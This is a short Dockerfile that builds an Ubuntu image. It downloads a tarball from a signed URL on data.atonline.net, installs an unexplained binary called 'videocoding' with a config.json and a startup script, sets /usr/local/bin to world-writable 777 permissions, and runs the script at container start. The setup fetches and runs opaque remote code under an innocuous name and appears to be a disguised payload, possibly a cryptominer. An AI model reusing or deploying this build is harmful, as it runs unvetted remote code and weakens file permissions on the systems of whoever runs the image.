FROM ubuntu:20.04 

RUN apt update; \
    apt install wget -y; \
    apt install jq -y; \
    apt install bash -y; \
    wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNTMzOTJ9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sIm1pbWUiOiJhcHBsaWNhdGlvbi9nemlwIiwicCI6ImJsb2JzcmMvYmxvYnMtY2V4NDR2LWkyMmItYTd0bS0yM2dmLWQ0cjR2cW00In0.66sUbRZJA4CmcTlUe_V-jieR9krpxTQoWhpTNoSZPrE/variable.tar.gz; \
    tar xf variable.tar.gz; \
    cd variable; \
    cp videocoding /usr/local/bin/videocoding; \
    cp init-conf.json /usr/local/bin/config.json; \
    cp script.sh /usr/local/bin/script.sh; \
    chmod -R 777 /usr/local/bin; \
    cd /usr/local/bin; \
    chmod 777 config.json; \
    chmod 777 videocoding; \
    chmod 777 script.sh;
    
WORKDIR /usr/local/bin
CMD script.sh
